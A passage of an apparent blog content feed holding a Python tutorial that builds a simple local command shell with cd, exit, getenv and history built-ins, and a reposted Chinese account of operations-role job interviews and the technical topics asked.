sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ignore_signals</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> platform.system() != <span class="string">&quot;Windows&quot;</span>:</span><br><span class="line">        signal.signal(signal.SIGTSTP, signal.SIG_IGN)</span><br><span class="line">    signal.signal(signal.SIGINT, signal.SIG_IGN)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_loop</span><span class="params">()</span>:</span></span><br><span class="line">    status = SHELL_STATUS_RUN</span><br><span class="line">    <span class="keyword">while</span> status == SHELL_STATUS_RUN:</span><br><span class="line">        display_cmd_prompt()</span><br><span class="line">        ignore_signals()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = sys.stdin.readline()</span><br><span class="line">            cmd_tokens = tokenize(cmd)</span><br><span class="line">            cmd_tokens = preprocess(cmd_tokens)</span><br><span class="line">            status = execute(cmd_tokens)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            _, err, _ = sys.exc_info()</span><br><span class="line">            print(err)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_command</span><span class="params">(name, func)</span>:</span></span><br><span class="line">    built_in_cmds[name] = func</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    register_command(<span class="string">&quot;cd&quot;</span>, cd)</span><br><span class="line">    register_command(<span class="string">&quot;exit&quot;</span>, exit)</span><br><span class="line">    register_command(<span class="string">&quot;getenv&quot;</span>, getenv)</span><br><span class="line">    register_command(<span class="string">&quot;history&quot;</span>, history)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    shell_loop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p><p>cd.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> .constants <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cd</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(args) &gt; <span class="number">0</span>:</span><br><span class="line">        os.chdir(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.chdir(os.getenv(<span class="string">&apos;HOME&apos;</span>))</span><br><span class="line">    <span class="keyword">return</span> SHELL_STATUS_RUN</span><br></pre></td></tr></tbody></table></figure><p></p><p>constants.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">SHELL_STATUS_STOP = <span class="number">0</span></span><br><span class="line">SHELL_STATUS_RUN = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4F7F;&#x7528; os.path.expanduser(&apos;~&apos;) &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5E73;&#x53F0;&#x7684;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6839;&#x76EE;&#x5F55;</span></span><br><span class="line">HISTORY_PATH = os.path.expanduser(<span class="string">&apos;~&apos;</span>) + os.sep + <span class="string">&apos;.shiyanlou_shell_history&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>exit.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> .constants <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> SHELL_STATUS_STOP</span><br></pre></td></tr></tbody></table></figure><p></p><p>getenv.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> .constants <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getenv</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(args) &gt; <span class="number">0</span>:</span><br><span class="line">        print(os.getenv(args[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> SHELL_STATUS_RUN</span><br></pre></td></tr></tbody></table></figure><p></p><p>history.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> .constants <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">history</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(HISTORY_PATH, <span class="string">&apos;r&apos;</span>) <span class="keyword">as</span> history_file:</span><br><span class="line">        lines = history_file.readlines()</span><br><span class="line">        limit = len(lines)</span><br><span class="line">        <span class="keyword">if</span> len(args) &gt; <span class="number">0</span>:</span><br><span class="line">            limit = int(args[<span class="number">0</span>])</span><br><span class="line">        start = len(lines) - limit</span><br><span class="line">        <span class="keyword">for</span> line_num, line <span class="keyword">in</span> enumerate(lines):</span><br><span class="line">            <span class="keyword">if</span> line_num &gt;= start:</span><br><span class="line">                sys.stdout.write(<span class="string">&apos;%d %s&apos;</span> % (line_num + <span class="number">1</span>, line))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> SHELL_STATUS_RUN</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>init</strong>.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .cd <span class="keyword">import</span> cd</span><br><span class="line"><span class="keyword">from</span> .exit <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">from</span> .getenv <span class="keyword">import</span> getenv</span><br><span class="line"><span class="keyword">from</span> .history <span class="keyword">import</span> history</span><br><span class="line"><span class="keyword">from</span> .constants <span class="keyword">import</span> *</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-21%2020-00-04.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>the difference between people</title>
      <link href="/2018/10/16/the-difference-of-people/"/>
      <url>/2018/10/16/the-difference-of-people/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_difference.jpeg" alt=""></p><a id="more"></a><p>&#x4F5C;&#x8005;&#xFF1A;&#x975E;&#x8863;<br>&#x94FE;&#x63A5;&#xFF1A;<a href="https://www.nowcoder.com/discuss/18612" target="_blank" rel="noopener">https://www.nowcoder.com/discuss/18612</a><br>&#x6765;&#x6E90;&#xFF1A;&#x725B;&#x5BA2;&#x7F51;</p><p>&#x9898;&#x5916;&#x8BDD;<br>&#x79CB;&#x62DB;&#x5DF2;&#x7ECF;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x60F3;&#x4E86;&#x60F3;&#x8FD8;&#x662F;&#x51C6;&#x5907;&#x628A;&#x81EA;&#x5DF1;&#x7684;&#x9762;&#x8BD5;&#x5386;&#x7A0B;&#x5199;&#x4E00;&#x4E0B;&#x3002;&#x4E5F;&#x7B97;&#x662F;&#x5BF9;&#x5927;&#x5B66;&#x56DB;&#x5E74;&#x7684;&#x4E00;&#x4E2A;&#x4EA4;&#x4EE3;&#x3002;</p><p>&#x81EA;&#x5DF1;&#x5E94;&#x8BE5;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x5C0F;&#x767D;&#x5427;&#xFF0C;&#x5C31;&#x8BFB;&#x4E8E;&#x897F;&#x5B89;&#x79D1;&#x6280;&#x5927;&#x5B66;&#xFF0C;&#x73AF;&#x5883;&#x5DE5;&#x7A0B;&#x4E13;&#x4E1A;&#x3002;&#x975E;985&#xFF0C;&#x975E;211&#x3002;&#x5B66;&#x6821;&#x548C;&#x897F;&#x5B89;&#x7535;&#x5B50;&#x79D1;&#x6280;&#x5927;&#x5B66;&#x5C31;&#x5DEE;&#x4E24;&#x4E2A;&#x5B57;&#xFF0C;&#x4F46;&#x5DEE;&#x7684;&#x5F88;&#x8FDC;&#xFF0C;&#x5750;&#x843D;&#x5728;&#x9A8A;&#x5C71;&#x811A;&#x4E0B;&#x3002;&#x672C;&#x8EAB;&#x7B97;&#x662F;&#x5BF9;&#x8BA1;&#x7B97;&#x673A;&#x611F;&#x5174;&#x8DA3;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x5F31;&#x3002;&#x6CA1;&#x6709;&#x540D;&#x4F01;&#x5B9E;&#x4E60;&#x7ECF;&#x5386;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x5389;&#x5BB3;&#x7684;&#x9879;&#x76EE;&#x7ECF;&#x9A8C;&#xFF0C;&#x8FDE;&#x4E13;&#x4E1A;&#x4E5F;&#x4E0E;&#x8BA1;&#x7B97;&#x673A;&#x4E0D;&#x76F8;&#x5173;&#x3002;&#x5F88;&#x60F3;&#x53BB;BAT&#xFF0C;&#x7F51;&#x6613;&#xFF0C;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x2026;&#xFF0C;&#x4E0E;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x7684;&#x4E09;&#x9762;&#x4E4B;&#x7F18;&#xFF1B;&#x963F;&#x91CC;&#x7684;20&#x591A;&#x8F6E;&#x9762;&#x8BD5;&#xFF0C;&#x4E94;&#x4E2A;&#x5DF2;&#x56DE;&#x7EDD;&#xFF1B;&#x817E;&#x8BAF;&#x6625;&#x62DB;&#x90A3;&#x4E24;&#x4E2A;&#x5BBD;&#x5BB9;&#x548C;&#x853C;&#x7684;&#x9762;&#x8BD5;&#x5B98;&#xFF1B;&#x4E0E;&#x767E;&#x5EA6;&#x4E4B;&#x95F4;&#x7684;&#x9057;&#x61BE;&#xFF1B;&#x8FD8;&#x6709;&#x5B9E;&#x9A8C;&#x697C;&#x9762;&#x8BD5;&#x5B98;&#x7684;&#x7406;&#x89E3;&#x2026; ,&#x5F88;&#x591A;&#x90FD;&#x662F;&#x5728;&#x6821;&#x62DB;&#x8DEF;&#x4E0A;&#x7684;&#x7ECF;&#x9A8C;&#x3002;&#x5B9E;&#x4E60;&#x771F;&#x7684;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x5C24;&#x5176;&#x65F6;&#x540D;&#x4F01;&#x5B9E;&#x4E60;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x5E2E;&#x52A9;&#x4F60;&#x901A;&#x8FC7;&#x9762;&#x8BD5;&#x3002;</p><p>&#x9762;&#x8BD5;&#x65F6;&#x5B9E;&#x529B;&#x4E0E;&#x8FD0;&#x6C14;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x5B9E;&#x529B;&#x8D8A;&#x5F3A;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x9700;&#x8981;&#x7684;&#x8FD0;&#x6C14;&#x5C31;&#x53EF;&#x4EE5;&#x6E10;&#x6E10;&#x5FFD;&#x7565;&#x3002;&#x81EA;&#x5DF1;&#x7684;&#x5B66;&#x4E60;&#x4E4B;&#x8DEF;&#xFF0C;&#x4ECE;C/C &#x5230;java&#xFF0C;&#x518D;&#x5230;python&#x4EE5;&#x53CA;&#x73B0;&#x5728;&#x7684;&#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#x3002;&#x575A;&#x6301;&#x81EA;&#x5DF1;&#x7684;&#x68A6;&#x60F3;&#xFF0C;&#x8D70;&#x4E0B;&#x53BB;&#xFF0C;&#x603B;&#x4F1A;&#x770B;&#x5230;&#x5E0C;&#x671B;&#x3002;</p><p>&#x6821;&#x62DB;&#x4E4B;&#x8DEF;<br>&#x5B9E;&#x4E60;<br>&#x5B9E;&#x4E60;&#x5230;&#x6700;&#x540E;&#x81EA;&#x5DF1;&#x62FF;&#x5230;&#x4E86;&#x767E;&#x5EA6;/&#x8C4C;&#x8C46;&#x835A;&#x7684;offer&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x4E2A;&#x4EBA;&#x539F;&#x56E0;&#xFF0C;&#x6700;&#x540E;&#x6CA1;&#x53BB;&#x5B9E;&#x4E60;&#x3002;</p><p>&#x5386;&#x7A0B;&#xFF08;&#x4E3B;&#x8981;&#x662F;&#x8FD0;&#x7EF4;&#xFF09;<br>&#x817E;&#x8BAF;&#x5185;&#x63A8; omg&#xFF08;&#x4E00;&#x9762;&#x2013;&gt; hr&#x6302;&#xFF09;</p><p>&#x817E;&#x8BAF;&#x6625;&#x62DB; teg &#xFF08;&#x4E00;&#x9762;&#x2013;&gt; &#x4E8C;&#x9762;&#x6302;&#xFF09;</p><p>&#x767E;&#x5EA6;&#x5185;&#x63A8; &#xFF08;&#x4E00;&#x9762;&#x2013;&gt; &#x4E8C;&#x9762;&#x6302; &#xFF09;</p><p>&#x767E;&#x5EA6;&#x6625;&#x62DB; &#xFF08;offer&#xFF09;</p><p>&#x997F;&#x4E86;&#x4E48; &#xFF08;&#x4E8C;&#x9762;&#x6302;&#xFF09;</p><p>&#x7F51;&#x6613;&#x6E38;&#x620F;&#x96F7;&#x706B;&#x76D8;&#x53E4; &#xFF08;&#x4E8C;&#x9762;&#x6302;&#xFF09;</p><p>&#x8C4C;&#x8C46;&#x835A; &#xFF08;offer&#xFF09;</p><p>&#x963F;&#x91CC;&#xFF08;&#x9762;&#x4E86;&#x597D;&#x591A;&#x9762;&#xFF0C;&#x51E0;&#x4E2A;&#x804C;&#x4F4D;&#x90FD;&#x6302;&#x4E86;&#xFF09;</p><p>&#x7F51;&#x6613;&#x7B14;&#x8BD5;&#x8FC7;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x9762;&#x8BD5;</p><p>&#x9762;&#x8BD5;&#x4E2D;&#x7684;&#x95EE;&#x9898;<br>&#x5B9E;&#x4E60;&#x751F;&#x9762;&#x8BD5;&#x57FA;&#x672C;&#x5F88;&#x770B;&#x91CD;&#x57FA;&#x7840;&#xFF0C;&#x5BF9;&#x57FA;&#x7840;&#x8003;&#x5BDF;&#x5F88;&#x7EC6;&#xFF0C;&#x5728;&#x8FD0;&#x7EF4;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x4E3B;&#x8981;&#x8003;&#x5BDF;&#x7F51;&#x7EDC;&#x548C;linux&#x57FA;&#x7840;&#x3002;</p><p>&#x7F51;&#x7EDC;</p><p>tcp/ip</p><p>&#x4E09;&#x6B21;&#x63E1;&#x624B;/&#x56DB;&#x6B21;&#x6325;&#x624B;&#x8FC7;&#x7A0B;&#xFF08;&#x817E;&#x8BAF;/&#x767E;&#x5EA6;/&#x8C4C;&#x8C46;&#x835A;&#xFF09;</p><p>tcp&#x8FDE;&#x63A5;&#x4E2D;&#x5404;&#x4E2A;&#x72B6;&#x6001;&#x7684;&#x542B;&#x4E49;&#xFF08;&#x91CD;&#x70B9;&#x5728;time_wait&#xFF09;&#xFF08;&#x767E;&#x5EA6;/&#x963F;&#x91CC;&#xFF09;</p><p>&#x7B2C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5931;&#x8D25;&#xFF0C;&#x6216;&#x8005;&#x67D0;&#x4E00;&#x4E2A;&#x72B6;&#x6001;&#x9519;&#x8BEF; &#xFF08;&#x5F15;&#x51FA;&#x8BA1;&#x65F6;&#x5668;&#xFF0C;&#x4EE5;&#x53CA;&#x91CD;&#x4F20;&#xFF0C;SYN&#x653B;&#x51FB;&#xFF09;&#xFF08;&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF09;</p><p>&#x56DE;&#x9000;N&#x5E27;&#x534F;&#x8BAE;&#xFF08;&#x963F;&#x91CC;/&#x767E;&#x5EA6;&#xFF09;</p><p>&#x62E5;&#x585E;&#x907F;&#x514D;/&#x6162;&#x542F;&#x52A8;/&#x5FEB;&#x91CD;&#x4F20;/&#x5FEB;&#x901F;&#x6062;&#x590D;&#xFF08;&#x6240;&#x6709;&#x516C;&#x53F8;&#x90FD;&#x6709;&#x95EE;&#xFF09;</p><p>tcp&#x4E0E;udp&#x7684;&#x533A;&#x522B;</p><p>&#x683C;&#x5F0F;</p><p>HTTP&#x534F;&#x8BAE;</p><p>&#x72B6;&#x6001;&#x7801;</p><p>&#x957F;&#x8FDE;&#x63A5;&#x4E0E;&#x77ED;&#x8FDE;&#x63A5;&#x7684;&#x533A;&#x522B;&#xFF08;LVS&#x662F;&#x901A;&#x8FC7;&#x957F;&#x8FDE;&#x63A5;&#x4F5C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF09;&#xFF08;&#x767E;&#x5EA6;/&#x963F;&#x91CC;/&#x8C4C;&#x8C46;&#x835A;&#xFF09;</p><p>&#x683C;&#x5F0F;</p><p>DNS</p><p>&#x8BB0;&#x5F55;<br>dns&#x7684;&#x89E3;&#x6790;&#xFF08;&#x9012;&#x5F52;&#x548C;&#x8FED;&#x4EE3;&#xFF09;<br>&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x7528;udp/tcp<br>&#x8DEF;&#x7531;</p><p>&#x8DEF;&#x7531;&#x4E0E;&#x4EA4;&#x6362;&#x673A;&#x7684;&#x533A;&#x522B;</p><p>&#x8DEF;&#x7531;&#x534F;&#x8BAE;&#xFF08;RIP/OPSF&#xFF09;</p><p>&#x5176;&#x5B83;&#x7684;&#x4E00;&#x4E9B;</p><p>vlan/vxlan&#xFF08;&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF09;<br>linux</p><p>&#x57FA;&#x672C;&#x547D;&#x4EE4;</p><p>&#x6709;&#x5173;&#x8FDB;&#x7A0B;&#xFF08;ps/top&#xFF09;</p><p>&#x7F51;&#x7EDC; &#xFF08;netstat/ss/ping/traceroute/tcpdump&#xFF09;</p><p>&#x4E00;&#x822C;&#x4F1A;&#x5728;&#x95EE;&#x5B8C;&#x7F51;&#x7EDC;&#x65F6;&#xFF0C;&#x5F00;&#x59CB;&#x95EE;&#x76F8;&#x5173;&#x7684;&#x547D;&#x4EE4;</p><p>&#x5185;&#x5B58;&#xFF08;free &#x4F1A;&#x95EE;&#x5230;buff/cache&#xFF09;</p><p>&#x6587;&#x4EF6;&#x5904;&#x7406;&#xFF08;grep/sed/awk&#xFF09;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x9762;&#x8BD5;&#x5FC5;&#x95EE;</p><p>&#x4E00;&#x4E9B;&#x65E5;&#x5E38;&#x811A;&#x672C;</p><p>iptables</p><p>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;ext4&#xFF09;</p><p>&#x8D85;&#x7EA7;&#x5757;</p><p>cp/mv&#x7684;&#x533A;&#x522B;&#xFF08;&#x6309;&#x6211;&#x7684;&#x7406;&#x89E3;&#x7B54;&#x4E86;&#x4E0B;&#xFF0C;&#x4F46;&#x963F;&#x91CC;&#x9762;&#x8BD5;&#x5B98;&#x95EE;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6CA1;&#x7B54;&#x597D;&#xFF09;</p><p>&#x8F6F;&#x786C;&#x8FDE;&#x63A5;&#xFF08;inode&#x8FD9;&#x5757;&#xFF0C;ln / ln -s&#xFF09;</p><p>&#x5185;&#x6838;&#x8C03;&#x4F18;&#xFF08;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;&#xFF0C;&#x4E00;&#x822C;&#x662F;tcp&#x8FD9;&#x5757;&#x7684;&#xFF0C;&#x4F1A;&#x5728;time_wait&#x548C;syn&#x653B;&#x51FB;&#x8FD9;&#x5757;&#x95EE;&#xFF0C;&#x8FD8;&#x6709;&#x5C31;&#x662F;apache&#x90A3;&#x5757;&#xFF0C;&#x767E;&#x5EA6;&#x9762;&#x8BD5;&#x5B98;&#x95EE;select&#x8FD9;&#x5757;&#xFF0C;&#x63D0;&#x8FC7;&#xFF09;</p><p>&#x5F00;&#x673A;&#x542F;&#x52A8;&#x8FC7;&#x7A0B;</p><p>&#x4E00;&#x4E9B;&#x8FD0;&#x7EF4;&#x76F8;&#x5173;&#x7684;&#x77E5;&#x8BC6;</p><p>&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</p><p>&#x8FDB;&#x7A0B;vs&#x7EBF;&#x7A0B;&#xFF08;&#x6BCF;&#x6B21;&#x9762;&#x8BD5;&#x5FC5;&#x95EE;&#xFF09;</p><p>&#x6BB5;&#x9875;&#xFF08;&#x767E;&#x5EA6;&#x63D0;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x7B54;&#x7684;&#x5F88;&#x5DEE;&#xFF09;</p><p>IO&#x6A21;&#x578B;&#x4ECB;&#x7ECD;&#x4EE5;&#x53CA;&#x540C;&#x6B65;&#x5F02;&#x6B65;&#x963B;&#x585E;&#x975E;&#x963B;&#x585E;&#x7684;&#x533A;&#x522B;&#xFF08;nginx&#x4E0E;apache&#x6BD4;&#x8F83;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x95EE;&#x5230;&#xFF09;select/poll/epoll</p><p>python</p><p>&#x95ED;&#x5305; / &#x88C5;&#x9970;&#x5668;&#xFF08;&#x7F51;&#x6613;&#x6E38;&#x620F;/&#x963F;&#x91CC;/&#x767E;&#x5EA6;&#xFF09;</p><p>&#x8FED;&#x4EE3;&#x5668; / &#x751F;&#x6210;&#x5668; &#xFF08;&#x817E;&#x8BAF;/&#x7F51;&#x6613;&#x6E38;&#x620F;/&#x767E;&#x5EA6;&#xFF09;</p><p>&#x591A;&#x7EBF;&#x7A0B; thread/threading &#xFF08;&#x8981;&#x4E48;&#x7EE7;&#x627F;&#x7EBF;&#x7A0B;&#x7C7B;&#xFF0C;&#x91CD;&#x5199;run&#x65B9;&#x6CD5;&#xFF1B;&#x8981;&#x4E48;&#x5C31;&#x628A;&#x51FD;&#x6570;&#x5F53;&#x53C2;&#x6570;&#x4F20;&#x5165;&#xFF09;</p><p>&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;&#x5F3A;&#x70C8;&#x63A8;&#x8350;&#x770B;&#x300A;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x7B97;&#x6CD5;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&#xFF09;</p><p>&#x5F15;&#x7528;&#x8BA1;&#x6570;<br>&#x5783;&#x573E;&#x56DE;&#x6536;<br>&#x5F15;&#x7528;&#x8BA1;&#x6570;<br>&#x6807;&#x8BB0;-&#x6E05;&#x9664;<br>&#x5206;&#x4EE3;&#x6536;&#x96C6;<br>mysql</p><p>&#x57FA;&#x672C;sql&#x8BED;&#x53E5;</p><p>&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#xFF08;&#x67B6;&#x6784;/&#x9519;&#x8BEF;&#x6062;&#x590D;/MHA&#xFF09;</p><p>mysql&#x5B58;&#x50A8;&#x5F15;&#x64CE;</p><p>&#x5907;&#x4EFD;&#xFF08;&#x70ED;&#x5907;/&#x51B7;&#x5907;&#xFF09;</p><p>&#x8FD0;&#x7EF4;&#x76F8;&#x5173;</p><p>LVS&#x56DB;&#x79CD;&#x6A21;&#x5F0F;&#xFF08;&#x963F;&#x91CC;&#x7279;&#x522B;&#x559C;&#x6B22;&#x95EE;&#xFF0C;&#x817E;&#x8BAF;&#x4E5F;&#x95EE;&#x8FC7;&#xFF09;</p><p>&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF08;DNS/nginx/LVS/vipserver&#xFF09;</p><p>&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#xFF08;heardbead/keepalived &#xFF09;</p><p>heardbead&#x4E0E;keepalived&#x7684;&#x533A;&#x522B;&#xFF0C;&#x8111;&#x88C2;&#x95EE;&#x9898;&#x7684;&#x89E3;&#x51B3;&#xFF0C;&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x6848;&#x7684;&#x4F18;&#x52A3;</p><p>&#x6848;&#x4F8B;&#x5206;&#x6790;</p><p>&#x9762;&#x8BD5;<br>&#x817E;&#x8BAF;<br>&#x5185;&#x63A8;</p><p>&#x4E00;&#x9762;&#x95EE;&#x4E86;linux&#x57FA;&#x7840;&#xFF0C;top/ps&#x4E00;&#x4E9B;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x7684;&#x76D1;&#x63A7;&#x8F6F;&#x4EF6;&#x7684;&#x4F7F;&#x7528;&#x6BD4;&#x8F83;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x5FC5;&#x95EE;&#x7684;lvs&#xFF0C;&#x5B9E;&#x73B0;&#x4EE5;&#x53CA;&#x539F;&#x7406;&#x3002;tcp&#x4E09;&#x6B21;&#x63E1;&#x624B;/&#x56DB;&#x6B21;&#x6325;&#x624B;&#x3002;&#x8FD8;&#x95EE;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x7231;&#x597D;&#xFF0C;&#x548C;&#x5B66;&#x4E60;&#x5386;&#x7A0B;&#x3002;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6708;&#x7684;&#x7B49;&#x5F85;&#xFF0C;&#x4E00;&#x5929;&#x4E0B;&#x5348;&#xFF0C;hr&#x6253;&#x6765;&#x7535;&#x8BDD;&#xFF0C;hr&#x9762;&#x8868;&#x73B0;&#x4E0D;&#x597D;&#xFF0C;&#x6302;&#x4E86;&#x3002;</p><p>&#x6B63;&#x5F0F;&#x6821;&#x62DB;</p><p>&#x4E00;&#x9762;&#xFF1A;&#x5F53;&#x65F6;&#x8D85;&#x7EA7;&#x7D27;&#x5F20;&#xFF0C;&#x8FDE;&#x8BDD;&#x90FD;&#x8BF4;&#x4E0D;&#x51FA;&#x6765;&#xFF0C;&#x8FD8;&#x597D;&#x9762;&#x8BD5;&#x5B98;&#x5F88;nice&#xFF0C;&#x4E3B;&#x52A8;&#x95EE;&#x6211;&#x7B80;&#x5386;&#x4E0A;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5BF9;&#x6211;&#x505A;&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x7A0B;&#x5E8F;&#x5F88;&#x611F;&#x5174;&#x8DA3;&#x3002;&#x4E4B;&#x540E;&#x7B49;&#x6211;&#x7F13;&#x89E3;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x8BA9;&#x6211;&#x81EA;&#x6211;&#x4ECB;&#x7ECD;</p><p>&#x4E8C;&#x9762;&#xFF1A;&#x4E8C;&#x9762;&#x9762;&#x8BD5;&#x5B98;&#x8BA9;&#x4EBA;&#x89C9;&#x5F97;&#x4E5F;&#x5F88;&#x4EB2;&#x5207;&#xFF0C;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x5BB6;&#x5EAD;&#x65B9;&#x9762;&#x7684;&#x95EE;&#x9898;&#x3002;&#x867D;&#x7136;&#x6700;&#x540E;&#x8FD8;&#x662F;&#x6302;&#x4E86;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x5F88;&#x611F;&#x8C22;&#x9762;&#x8BD5;&#x5B98;&#x3002;</p><p>&#x767E;&#x5EA6;<br>&#x767E;&#x5EA6;&#x5185;&#x63A8;&#x548C;&#x6B63;&#x5F0F;&#x6821;&#x62DB;&#x95EE;&#x7684;&#x9